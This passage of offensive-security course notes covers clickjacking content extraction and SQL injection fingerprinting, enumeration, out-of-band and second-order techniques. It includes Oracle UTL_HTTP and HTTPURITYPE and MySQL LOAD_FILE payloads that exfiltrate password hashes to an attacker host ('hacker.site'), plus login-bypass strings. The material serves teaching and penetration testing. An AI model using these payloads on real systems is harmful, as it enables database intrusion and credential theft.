<p>We need to be a little more creative and maybe create something like a pilot Drag and Drop game, where the victim will move our malicious pieces of code into the target locations.</p>
<p>To explain this kind of exploitation, Krzysztof Kotowicz has developed a vulnerable scenario and a simple game to exploit the vulnerability named <a href="http://blog.kotowicz.net/2011/03/exploiting-unexploitable-xss-with.html">Alphabet Hero</a>.</p>
<h5 id="-content-extraction-"><strong>Content Extraction</strong></h5>
<p>If the <strong>secret</strong> is part of a URL, in an HTML <strong>anchor</strong> element or an <strong>image</strong>, dragging is quite easy. In fact, when the elements are dropped onto a target location, they will be converted into a serialized URL.</p>
<p>The difficult part is when the secret is not easily draggable because it is part of a textual content of the page. Then, we need to trick the victim into first selecting the section we want and then later dropping the selection on our text area.</p>
<p>Sometimes, information in clear text is not enough and we need to go deeper into the page. For example, let’s think about anti-CSRF tokens hidden in forms, or whatever is only visible by inspecting the source code.</p>
<p>We could use the view-source: pseudo-protocol to load the HTML source code into an iframe. So instead of using:</p>
<pre><code class="lang-html"> <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://victim.site/secretInfoHere/"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
</code></pre>
<p>We change the <code>src</code> attribute to:</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"view-source:http://victim.site/secretInfoHere/"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
</code></pre>
<p>The downside of this approach is that, despite many browsers supporting the view-source pseudo protocol, this technique only works on Firefox, without the NoScript add on.</p>
<h2 id="-labs-"><strong>Labs</strong></h2>
<h4 id="-cors-"><strong>CORs</strong></h4>
<ul>
<li><a href="https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors">https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors</a><h4 id="-post-messages-"><strong>POST Messages</strong></h4>
</li>
<li><a href="https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities">https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities</a></li>
<li><a href="https://html5.digi.ninja/">https://html5.digi.ninja/</a><h4 id="-clickjacking-"><strong>Clickjacking</strong></h4>
</li>
<li><a href="https://portswigger.net/web-security/all-labs#clickjacking">https://portswigger.net/web-security/all-labs#clickjacking</a></li>
</ul>
<hr>
<h1 id="-sql-injection-"><strong>SQL Injection</strong></h1>
<h3 id="-introduction-"><strong>Introduction</strong></h3>
<p>SQL Injection attacks are so evolved that, surprisingly, their goal is not only to manipulate the database and gain access to the underlying OS, but also illicit DoS attacks, spread malware, phishing, etc.</p>
<p>In this module, we are going to lay the foundation for an advanced comprehension of what the SQL injection world offers. We&#39;ll analyze the most common DBMS and learn how to perform advanced attacks against them.</p>
<p>SQL Injection is an attack against the original purpose a developer has chosen for a specific piece of SQL code. The idea is to alter the original SQL query structure by leveraging the syntax, DBMS and/or OS functionalities in order to perform malicious operations.</p>
<p>In this module, we will analyze three major Relational Database Management Systems (RDBMS) in use today:</p>
<ul>
<li>MySQL</li>
<li>Microsoft SQL Server</li>
<li>Oracle<h2 id="-exploiting-sqli-"><strong>Exploiting SQLi</strong></h2>
</li>
</ul>
<p>In this chapter, we will cover key concepts about the technique classification that we are going to analyze during this module. We will also see an analysis of the main methodologies which are useful in gathering information from the targeted environment.</p>
<h3 id="-techniques-classification-"><strong>Techniques Classification</strong></h3>
<p>There is a great deal of literature containing different SQLi technique classifications. Most of these documented sources try to collect different exploitation techniques according to various parameters. These may include <strong>the exploitation intent, the source of exploitation</strong> or technical aspects about the <strong>input attack</strong>.</p>
<p>In this module, the <strong>SQLi Techniques Classification</strong> is based on channels used during the reconnaissance process. These classes are: <strong>INBAND</strong>, <strong>OUT-OF-BAND</strong> and <strong>INFERENCE</strong>.</p>
<p>Let&#39;s briefly unpack what&#39;s the context of these three classes of attack look like.</p>
<h4 id="-inband-attacks-"><strong>Inband Attacks</strong></h4>
<p>Inband attacks leverage the same channel used to inject the SQL code. This is the most common and straightforward attack scenario in which the result of the exploitation is included directly in the response from the vulnerable web application.</p>
<p>The most common techniques for this category are: <strong>UNION-based</strong> and <strong>Error based</strong>.</p>
<h4 id="-out-of-band-attacks-"><strong>Out-of-Band Attacks</strong></h4>
<p>Contrary to <strong>Inband</strong> attacks, <strong>Out-of-Band (OOB)</strong> techniques use alternative channel(s) to extract data from the server. There are several choices in this classification, but these generally depend upon the back end technologies implemented. Some of these include the following: HTTP(s) requests, DNS resolution, E-mail, File System.</p>
<p>Exploiting a SQLi using <strong>OOB</strong> methods is particularly useful when all Inband techniques have failed because attempted vectors have been disabled, limited, or filtered. When the only option is to use Blind techniques (<strong>Inference</strong>), reducing the number of queries is a must!</p>
<h5 id="-http-based-oob-exploitation-"><strong>HTTP Based OOB Exploitation</strong></h5>
<p>A simple example is an <strong>HTTP based OOB technique</strong> that sends the result of the SQL query by HTTP request, usually via GET, toward a hacker-controlled HTTP server.</p>
<p>OOB Attacks, in stark contrast to both Inband and Inference techniques, are not very widespread because of the level of complexity involved.</p>
<h4 id="-inference-attacks-"><strong>Inference Attacks</strong></h4>
<p>The third technique is <strong>Inference</strong>, more commonly known as <strong>Blind</strong>. As the name itself suggests, this category is based upon inference techniques so that all methods that allow information extraction are based on a set of focused deductions.</p>
<p>Depending on the behavior of the observed vulnerability, there are several possible techniques to use; however, the most common are the following:</p>
<ul>
<li>Boolean-Based</li>
<li>Time-Based<h5 id="-boolean-based-"><strong>Boolean-Based</strong></h5>
</li>
</ul>
<p>In <strong>Boolean-based</strong> blind techniques, the focus is on visible changes inside web server responses. For example, if the result of a query is not NULL, the server returns &quot;<em>Great</em>“, while &quot;<em>Nooo</em>&quot; otherwise.</p>
<pre><code><span class="hljs-keyword">if</span>(result_query)
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Great!"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Nooo"</span>
</code></pre><h5 id="-time-based-"><strong>Time-Based</strong></h5>
<p>Time-based techniques move the focus on delays: &quot;Delayed or not delayed, this is the question…&quot; For example, if the result of a query is as expected wait 15 seconds before reply.</p>
<h3 id="-gathering-information-from-the-environment-"><strong>Gathering Information from the Environment</strong></h3>
<p>We have found a <strong>valid</strong> SQL Injection point, so now it&#39;s time to proceed with exploiting the injection flaw, but first we need to understand some basic fundamentals about our backend DBMS.</p>
<p>Let&#39;s discuss two techniques that are useful in performing information gathering; remember that fingerprinting techniques may vary under these two circumstances:</p>
<ul>
<li>Non-Blind</li>
<li>Blind</li>
</ul>
<p>Our goals are gathering information (<strong>DBMS version</strong>, <strong>Databases structure</strong> and <strong>data</strong>), <strong>Database Users</strong> and their <strong>privileges</strong>.</p>
<p>Alright, let&#39;s get started.</p>
<h4 id="-identify-the-dbms-"><strong>Identify the DBMS</strong></h4>
<p>The first piece of necessary information we need is <strong>what DBMS version</strong> we are testing. Without this information, we cannot adjust queries, specific to the context, and successfully proceed with the exploitation.</p>
<h5 id="-error-code-analysis-"><strong>Error Code Analysis</strong></h5>
<p>To detect the DBMS version, the most straightforward method consists of forcing the vulnerable application to return an error message. The more verbose the server errors are the better!</p>
<h5 id="-banner-grabbing-"><strong>Banner Grabbing</strong></h5>
<p>Sometimes, the error code analysis doesn&#39;t return many details, like the exact version and patch level; however, it does return the database name. Obviously, obtaining any of this information can still help in determining if the DBMS has some well-known flaws.</p>
<p>The best way to identify the DMBS is by leveraging the NON-Blind scenario. Every DBMS implements specific functions that return the current version, so retrieving that value is straightforward.</p>
<table>
<thead>
<tr>
<th>DBMS</th>
<th>Functions</th>
</tr>
</thead>
<tbody>
<tr>
<td>MySQL</td>
<td><code>@@VERSION</code><br><code>@@GLOBAL.VERSION</code><br><code>VERSION()</code></td>
</tr>
<tr>
<td>MS SQL</td>
<td><code>@@VERSION</code></td>
</tr>
<tr>
<td>Oracle</td>
<td><code>version FROM v$instance</code><br><code>banner FROM v$VERSION WHERE banner LIKE &#39;oracle%&#39;</code><br><code>banner FROM gv$VERSION WHERE banner LIKE &#39;oracle%&#39;</code></td>
</tr>
</tbody>
</table>
<h5 id="-educated-guessing-"><strong>Educated Guessing</strong></h5>
<p>The approach is different if we are facing a <strong>BLIND</strong> scenario. In this case, we can execute <strong>Educated Guessing</strong> of what&#39;s behind the injection point. To do this, there are many observation methods.</p>
<h6 id="-string-concatenation-"><strong>String Concatenation</strong></h6>
<p>Each DBMS handles strings differently, making the way which String Concatenation is handled even more interesting. We can infer the DBMS version by observing the replies to different concatenation syntaxes, as we can see below:</p>
<table>
<thead>
<tr>
<th>DBMS</th>
<th>Concatenation statements</th>
<th>Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>MySQL</td>
<td><code>&#39;Concat&#39;&#39;enation&#39;</code><br><code>CONCAT(&#39;Concat&#39;,&#39;enation&#39;)</code></td>
<td>Concatenation</td>
</tr>
<tr>
<td>MS SQL</td>
<td><code>&#39;some&#39; + &#39;enation&#39;</code><br><code>CONCAT(&#39;Concat&#39;,&#39;enation&#39;)</code> <sub>[from v2012]</sub></td>
<td>Concatenation</td>
</tr>
<tr>
<td>Oracle</td>
<td>`&#39;Concat&#39; \</td>
<td>\</td>
<td>&#39;enation&#39;<code>&lt;br&gt;</code>CONCAT(&#39;Concat&#39;, &#39;enation&#39;)`</td>
<td>Concatenation</td>
</tr>
</tbody>
</table>
<h6 id="-numeric-functions-"><strong>Numeric Functions</strong></h6>
<p>Likewise, if the injection point is evaluated as a number, we can perform the same approach, but with Numeric Functions.</p>
<table>
<thead>
<tr>
<th>DBMS</th>
<th>Numeric functions</th>
<th>Result</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>MySQL</strong></td>
<td><code>CONNECTION_ID()</code><br><code>LAST_INSERT_ID()</code><br><code>ROW_COUNT()</code><br>...</td>
<td>All functions return an INTEGER NUMBER in the respective database while generate ERROR on all others</td>
</tr>
<tr>
<td><strong>MS SQL</strong></td>
<td><code>@@PACK_RECEIVED</code><br><code>@@ROWCOUNT</code><br><code>@@TRANCOUNT</code><br>...</td>
<td>All functions return an INTEGER NUMBER in the respective database while generate ERROR on all others</td>
</tr>
<tr>
<td><strong>Oracle</strong></td>
<td><code>BITAND(0,1)</code><br><code>BIN_TO_NUM(1)</code><br><code>TO_NUMBER(1231)</code><br>...</td>
<td>All functions return an INTEGER NUMBER in the respective database while generate ERROR on all others</td>
</tr>
</tbody>
</table>
<h6 id="-sql-dialect-"><strong>SQL Dialect</strong></h6>
<p>Other interesting assumptions can be reached by observing how comments are handled. Let&#39;s look at the following <a href="https://dev.mysql.com/doc/refman/8.0/en/comments.html">MySQL comments syntax</a> : there are 3 (official) comment styles plus one (unofficial):</p>
<table>
<thead>
<tr>
<th>Syntax</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>#</code> <em>Hash</em></td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2 # &#39; AND password =&#39;&#39;;</code></td>
</tr>
<tr>
<td><code>/*</code> <em>C-style</em></td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2 /* &#39; AND password =*/ &#39;&#39;;</code></td>
</tr>
<tr>
<td><code>--</code> <em>SQL</em></td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2 -- -- &#39; AND password =&#39;&#39;;</code></td>
</tr>
<tr>
<td><code>;%00</code> <em>NULL byte</em></td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2; [NULL] &#39; AND password =&#39;&#39;;</code></td>
</tr>
</tbody>
</table>
<h4 id="-enumerating-the-dbms-content-"><strong>Enumerating the DBMS Content</strong></h4>
<p>Sometimes, our victim host may contain both multiple databases and store a great deal of useful information. In these situations, it&#39;s crucial for us not only to be organized, but also know how to gather information from the tested environment.</p>
<p>From a pentester&#39;s point of view, the smartest way to begin is by enumerating the list of database schemas proceeded by tables, column and users. Using this technique, it&#39;s much easier to both detect relevant information, and it&#39;s considerably faster than the extraction process.</p>
<p>Let’s next look at how our three baseline DBMS’s manage data and users. We&#39;ll see how to enumerate the list of all schemas, the related tables, columns , users and privileges by showing some key queries and techniques.</p>
<h5 id="-databases-"><strong>Databases</strong></h5>
<p>Each DBMS handles databases in its own way. Each one uses specific tables to store information about the schemas (tables, columns, users, …), the server and other useful information. This “information” is also known as <strong>metadata</strong>, <strong>system catalog</strong> or <strong>data dictionary</strong>.</p>
<h6 id="-mysql-"><strong>MySQL</strong></h6>
<p>In MySQL, <code>INFORMATION_SCHEMA</code> is the magic place where we can retrieve all the metadata required. All the information about the other databases are stored within the table <strong>SCHEMATA</strong>.</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> schema_name <span class="hljs-keyword">FROM</span> information_schema.schemata;
</code></pre>
<p>If the user is running MySQL has <code>SHOW</code> privileges, then the previous query can be condensed into this:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SHOW </span>databases<span class="hljs-comment">;</span>
<span class="hljs-comment"># OR</span>
<span class="hljs-keyword">SHOW </span><span class="hljs-keyword">schemas;</span>
</code></pre>
<p>MySQL also provides a list of useful functions and operators. In this case, we can either use <code>DATABASE()</code> or its alias, <code>SCHEMA()</code>, to obtain the default or current database name. These come from the pool of <strong>Information Functions</strong>.</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> DATABASE();
# <span class="hljs-keyword">OR</span>
<span class="hljs-keyword">SELECT</span> SCHEMA();
</code></pre>
<h6 id="-mssql-"><strong>MSSQL</strong></h6>
<p>In SQL Server, all the system-level information is stored within the <strong>System Tables</strong>. Depending on the version of the DBMS, these tables exists either only in the <strong>MASTER</strong> database or in every database.</p>
<p>Information about the databases is stored in the system table: <code>sysdatabases</code>. This table is accessible from all the databases, therefore making the following queries the equivalent:</p>
<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> master..sysdatabases;
<span class="hljs-comment">-- OR</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> sysdatabases;
</code></pre>
<p>The alternative to System Tables are <strong>SYSTEM VIEWS</strong> , a set of views exposing metadata. These are defined in each database and contain metadata for all the objects stored within that particular database. The most interesting views, for our purposes, are: <strong>Compatibility</strong> and <strong>Information Schema</strong>.</p>
<p>For a mapping between System Tables and System Views, you can find the information on the following page: <a href="http://msdn.microsoft.com/en-us/library/ms187997.aspx">Mapping System Tables to System Views</a>.</p>
<p>So, as an alternative to using the <strong>Catalog</strong> view, we can also extract database information this way:</p>
<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> SYS.databases;
</code></pre>
<p>We can also leverage a utility function, <code>DB_NAME(id)</code>, to obtain information about the current database, as we can see below:</p>
<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> DB_NAME();
</code></pre>
<p>Providing a smallint ID, we can retrieve the information of a specific database. See the example below:</p>
<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> DB_NAME(<span class="hljs-number">1</span>);
</code></pre>
<p>Here are the list of names and IDs:</p>
<pre><code class="lang-sql">SELECT dbid, DB_NAME(dbid) <span class="hljs-keyword">from</span> master..sysdatabases:
</code></pre>
<h6 id="-oracle-"><strong>Oracle</strong></h6>
<p>Compared to MySQL and SQL Server, Oracle is a mess! It doesn&#39;t have a simple model system like the previous two. There are two key concepts to understand.</p>
<ul>
<li><strong>DATABASE</strong>: Where are stored the physical files.</li>
<li><strong>INSTANCE</strong>: The pool of processes, memory areas, etc. useful to access data.</li>
</ul>
<p>Each <strong>DATABASE</strong> must point to an <strong>INSTANCE</strong> that has its custom logical and physical structures in order to store information like tables, indexes, etc. Ignoring the physical structures, the most important and relevant logic structure for us is the <strong>TABLESPACE</strong>.</p>
<p><strong>TABLESPACEs</strong> are the place where <strong>Oracle</strong> stores database objects such as tables, indexes, etc. It is possible to assign a <strong>TABLESPACE</strong> for each user and then assign some portions of the DB where they can work, thus making the administration efficient against exploitations!</p>
<p>If what we&#39;ve just discussed makes sense, we can continue with the following query that will list the <strong>TABLESPACES</strong> the current user can use: </p>
<pre><code class="lang-plsql"><span class="hljs-keyword">SELECT</span> TABLESPACE_NAME <span class="hljs-keyword">FROM</span> USER_TABLESPACES
</code></pre>
<p><strong>SYSTEM</strong> and <strong>SYSAUX</strong> are the system <strong>TABLESPACES</strong> created automatically at the beginning when the database is made.</p>
<p>If we want to retrieve the default <strong>TABLESPACE</strong>, we need this query:</p>
<pre><code class="lang-plsql"><span class="hljs-keyword">SELECT</span> DEFAULT_TABLESPACE <span class="hljs-keyword">FROM</span> USER_USERS
-- <span class="hljs-keyword">OR</span>
<span class="hljs-keyword">SELECT</span> DEFAULT_TABLESPACE <span class="hljs-keyword">FROM</span> SYS.USER_USERS
</code></pre>
<p>Where <code>USER_USERS</code> is the table in <code>SYS</code> that describes the current user.</p>
<p>Once we have discovered the location of our data dictionaries, the enumeration of the DBMS content becomes a little easier.</p>
<p>Now, let&#39;s extend our enumeration to all the tables and columns found in the database.</p>
<h5 id="-tables-columns-mysql-"><strong>Tables &amp; Columns - MySQL</strong></h5>
<p>In MySQL, <code>INFORMATION_SCHEMA.TABLES</code> is the table that provides information about tables in the databases managed. We can run the following query to select this information: </p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> TABLE_SCHEMA, TABLE_NAME <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.TABLES;
</code></pre>
<p>The respective alias is:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SHOW</span> TABLES; <span class="hljs-meta"># current schema</span>
<span class="hljs-keyword">SHOW</span> TABLES in EMPLOYEES; <span class="hljs-meta"># other database</span>
</code></pre>
<p>In a similar fashion, the columns in tables are within the <code>INFORMATION_SCHEMA.COLUMNS</code> table:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS;
</code></pre>
<p>The respective alias is:</p>
<pre><code class="lang-mysql">SHOW COLUMNS FROM DEPARTMENTS <span class="hljs-keyword">IN</span> EMPLOYEES; <span class="hljs-comment"># cols in a table, database</span>
</code></pre>
<h5 id="-database-users-and-privileges-mysql-"><strong>Database Users and Privileges - MySQL</strong></h5>
<p>Finally, let&#39;s see how to retrieve the list of users, the current user, and their related privileges.</p>
<p>MySQL provides a list of functions and constants to select the current user. This is the list of some of the useful functions for our context:</p>
<table>
<thead>
<tr>
<th>Method</th>
<th>Type</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>User()</code></td>
<td>FUNCTION</td>
</tr>
<tr>
<td><code>Current_user()</code></td>
<td>FUNCTION</td>
</tr>
<tr>
<td><code>System_user()</code></td>
<td>FUNCTION</td>
</tr>
<tr>
<td><code>Session_user()</code></td>
<td>FUNCTION</td>
</tr>
<tr>
<td><code>Current_user</code></td>
<td>CONSTANT</td>
</tr>
</tbody>
</table>
<p>Whereas, if the current user is privileged, we can retrieve the list of all users this way:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">FROM</span> mysql.user;
</code></pre>
<p>MySQL is a system database that, by default, is only usable to a root user.</p>
<p>What a user can do is defined through privileges. In MySQL, the privileges are all stored within the <code>INFORMATION_SCHEMA</code> database and organized by the following tables:</p>
<table>
<thead>
<tr>
<th>INFORMATION_SCHEMA Table</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>COLUMN_PRIVILEGES</code></td>
</tr>
<tr>
<td><code>SCHEMA_PRIVILEGES</code></td>
</tr>
<tr>
<td><code>TABLE_PRIVILEGES()</code></td>
</tr>
<tr>
<td><code>USER_PRIVILEGES</code></td>
</tr>
</tbody>
</table>
<p>So, for example, all user privileges can be selected in this way:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> grantee, privilege_type <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.USER_PRIVILEGES;
</code></pre>
<p>Whereas, if we are looking for privileges on databases, this is the query to use:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> grantee, table_schema, privilege_type <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.SCHEMA_PRIVILEGES;
</code></pre>
<p>For the privileged users, we can once again use the <code>mysql.user</code> table to select the privileges from the respective columns.</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>, select_priv, … , <span class="hljs-keyword">FROM</span> MYSQL.USER;
</code></pre>
<p>If we want to gather the DBA accounts, then we may need to improve the previous query using a <code>WHERE</code> clause:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> grantee, privilege_type <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.USER_PRIVILEGES <span class="hljs-keyword">WHERE</span> privilege_type =<span class="hljs-string">'SUPER'</span>;
</code></pre>
<p>Whereas, privileged users need to change their select query on the <code>mysql.user</code> table in the following way:</p>
<pre><code class="lang-mysql">SELECT <span class="hljs-keyword">user</span> <span class="hljs-title">FROM</span> MYSQL.<span class="hljs-keyword">USER</span> <span class="hljs-title">WHERE</span> Super_priv = 'Y';
</code></pre>
<p>In this context, MSSQL is similar to MySQL. We have the following list of functions and constants to select the current user:</p>
<table>
<thead>
<tr>
<th>Method</th>
<th>Type</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>suser_sname()</code></td>
<td>FUNCTION</td>
</tr>
<tr>
<td><code>User</code></td>
<td>CONSTANT</td>
</tr>
<tr>
<td><code>System_user</code></td>
<td>CONSTANT</td>
</tr>
</tbody>
</table>
<h2 id="-advanced-sqli-exploitation-"><strong>Advanced SQLi Exploitation</strong></h2>
<h3 id="-out-of-band-exploitation-"><strong>Out-of-Band Exploitation</strong></h3>
<p>Let’s now introduce a set of exploitation techniques useful when facing <strong>Special-Blind SQL Injection</strong> scenarios. In these situations, we cannot rely on the inferential techniques to retrieve data. These will not work because the results are being limited, filtered, and so forth; therefore, we need to opt for another <strong>CHANNEL</strong> to carry this information.</p>
<p>These techniques are known as: <strong>Out-of-Band</strong> or <strong>OOB Exploitation</strong>. Here, the main concept, is to use alternative channels to convey information that, on the &quot;normal channels”, is denied.</p>
<p>The next image should make this concept clearer.</p>
<h4 id="-alternative-oob-channels-"><strong>Alternative OOB Channels</strong></h4>
<p>![[out-of-band-sqli.png]]</p>
<p>As you can see from the previous image, there is am alternative channel we can use. The most relevant are: HTTP, DNS, email and Database Connections. In this chapter, we&#39;ll see only the first two because they are the most common scenarios. Using one channel over another depends on a number of factors (IE: the targeted DBMS). Each system defines its own features and policies; therefore, the use of a specific channel can be suitable only for that specific system context supporting that feature.</p>
<h4 id="-out-of-band-exploitation-oob-via-http-"><strong>Out-of-Band Exploitation (OOB) via HTTP</strong></h4>
<p>Let&#39;s start exploring these channels from the <strong>HTTP</strong> perspective. We can leverage the HTTP channel for the DBMS systems that provide features for accessing data on the Internet over HTTP using SQL. Using these features, we can create a query to a web resource controlled by the hacker and then control the access log for analyzing all the requests arrived.</p>
<p>Among our three baseline DBMSs managed, the only system that provides this type of feature natively is Oracle. Here we can use two different techniques in performing HTTP requests. The first is the <code>UTL_HTTP</code> package followed by the second option, <code>HTTPURIType</code>, a subtype of the <code>URIType</code> object.</p>
<h5 id="-oracle-url_http-package-"><strong>Oracle URL_HTTP Package</strong></h5>
<p>The <code>UTL_HTTP</code> package is interesting because it can be used both via SQL and PL/SQL. The package has two useful functions to perform HTTP requests: <code>REQUEST</code> and <code>REQUEST_PIECES</code>. and Both of these show a string length of 2000 or less bytes, which is the result returned from the HTTP request.</p>
<p>However, only the REQUEST function can be used straight in a SQL query. See below:</p>
<pre><code class="lang-plsql"><span class="hljs-keyword">SELECT</span> UTL_HTTP.REQUEST (<span class="hljs-string">'hacker.site/'</span>|| (<span class="hljs-keyword">SELECT</span> spare4 <span class="hljs-keyword">FROM</span> SYS.USER$ <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">ROWNUM</span>=<span class="hljs-number">1</span>)) <span class="hljs-keyword">FROM</span> DUAL;
</code></pre>
<p>Whereas, <code>REQUEST_PIECES</code> must be used within a PL/SQL block. Check out this example.</p>
<pre><code class="lang-plsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">REPLACE</span> <span class="hljs-keyword">FUNCTION</span> readfromweb (<span class="hljs-keyword">url</span> VARCHAR2)
    <span class="hljs-keyword">RETURN</span> <span class="hljs-keyword">CLOB</span>
<span class="hljs-keyword">IS</span> 
    pcs UTL_HTTP.HTML_PIECES;
    retv CLOB;
<span class="hljs-keyword">BEGIN</span>
    pcs := UTL_HTTP.request_pieces (<span class="hljs-keyword">url</span>, <span class="hljs-number">50</span>);
    FOR iIN 1 .. pcs.COUNT
    LOOP
        retv := retv || pcs (i);
    <span class="hljs-keyword">END</span> <span class="hljs-keyword">LOOP</span>;
    RETURN retv;
<span class="hljs-keyword">END</span>;
</code></pre>
<h5 id="-oracle-httpuritype-package-"><strong>Oracle HTTPURITYPE Package</strong></h5>
<p>From the attacker&#39;s point of view, the downside of using the <code>UTL_HTTP</code> is that it is identified as a potential security problem in Administrator security guides, therefore it is often disabled.</p>
<p>On the other hand, <code>HTTPURIType</code> is not marked as a risky method, thus it is more likely to be discovered as a potential way in.</p>
<p>We can also exfiltrate information via HTTP, using this package:</p>
<pre><code class="lang-plsql"><span class="hljs-keyword">SELECT</span> HTTPURITYPE (<span class="hljs-string">'hacker.site/'</span>|| (<span class="hljs-keyword">SELECT</span> spare4 <span class="hljs-keyword">FROM</span> SYS.USER$ <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">ROWNUM</span>=<span class="hljs-number">1</span>)) .getclob() <span class="hljs-keyword">FROM</span> DUAL;
</code></pre>
<p>The <code>GETCLOB()</code> method returns the Character Large Object (<code>CLOB</code>) retrieved, but we can also use other methods such as: <code>GETBLOB()</code>, <code>GETXML()</code> and <code>GETCONTENTTYPE()</code>.</p>
<h4 id="-oob-via-dns-"><strong>OOB via DNS</strong></h4>
<p>Another interesting exfiltration channel is, without a doubt, DNS. The main concept is similar to the <strong>HTTP</strong> exfiltration technique, but in this case, we leverage the <strong>DNS</strong> resolution process for retrieving the results of our query. In this context, instead of controlling the web server we have to control a <strong>DNS server</strong>.</p>
<p>There are several pros to leveraging this technique. For example, even if the administrator sets an aggressive firewall policy filtering out any outgoing connections, the victim site will still both be able to reply to requests and <strong>perform DNS queries</strong>.</p>
<p>In an <strong>OOB</strong> via <strong>DNS</strong> attack, the server uses a DNS resolver configured by the network administrator, but the resolver needs to contact a DNS server under the attacker&#39;s control, therefore giving back the results of the injection to the attacker.</p>
<h5 id="-provoking-dns-requests-"><strong>Provoking DNS Requests</strong></h5>
<p>To perform this kind of Out-of-Band exploitation, we need to have a DBMS that supports (in some way) features able to trigger the DNS resolution process. Generally, these features are the ones that operate at the networking level.</p>
<p>Let&#39;s see some examples.</p>
<p>In MySQL, the function <code>LOAD_FILE()</code> reads the file and returns the file contents as a string:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-string">"C:\\Windows\\system.ini"</span>);
</code></pre>
<p>We can exploit this function and provoke DNS requests by requesting a UNC path like this: <code>\\[data].hacker.site</code></p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-keyword">CONCAT</span>(<span class="hljs-string">'\\\\'</span>, <span class="hljs-string">'SELECT password FROM mysql.user WHERE user=\'root\''</span>, <span class="hljs-string">'.hacker.site'</span>));
</code></pre>
<blockquote>
<p>[!Note]
The backslash is a special character in MySQL, thus it must be escaped.</p>
<h3 id="-exploiting-second-order-sql-injection-"><strong>Exploiting Second-Order SQL Injection</strong></h3>
</blockquote>
<p>Usually, when discussing SQL injections it means discussing &quot;first-order&quot; SQL injections scenarios. This is where the exploitation steps are similar to a challenge-response.</p>
<h4 id="-first-order-example-"><strong>First-order Example</strong></h4>
<ol>
<li>The attacker submits his malicious request.</li>
<li>The victim application elaborates the request and thus triggers the injected query.</li>
<li>The results of the query are returned in some way to the attacker.<h4 id="-second-order-example-"><strong>Second-order Example</strong></h4>
</li>
</ol>
<p>There is a kind of “<em>level-up</em>” to this injection scenario known as &quot;<strong>second-order</strong>&quot; SQL Injection. What&#39;s different in this new “level” is the sequence of events that occurs.</p>
<ol>
<li>The attacker submits his malicious request.</li>
<li>The application stores that input and responds to the request.</li>
<li>The attacker submits another request (SECOND).</li>
<li>To handle the second request, the application retrieves the previously stored input and processes it. This time, the attacker’s injected query is executed - the results of the query are returned in some way to the attacker.</li>
</ol>
<p>As you can imagine, there are numerous possible scenario’s which all typically depend upon how the application is developed.</p>
<h4 id="-security-considerations-"><strong>Security Considerations</strong></h4>
<p><strong>Second-order SQL injections</strong> are extremely powerful, much like their equivalent in the <strong>first-order</strong> space; however, due to their nature, they are more difficult to detect. The exploit is submitted in one request and triggered when the application handles a different request.</p>
<p>This is due to the fact that, generally, developers are careful when receiving input’s directly from users. One of the capstone rules of development says: &quot;<strong>never trust user input</strong>&quot;.</p>
<h4 id="-automation-considerations-"><strong>Automation Considerations</strong></h4>
<p>Modern automated scanners are unable to perform the rigorous methodology necessary for discovering second order vulnerabilities. This is because there are several possible scenarios, and without an understanding of the meaning and usage of data items within the application, the work involved in detecting second-order SQL injection grows exponentially base on size of the application&#39;s functionality.</p>
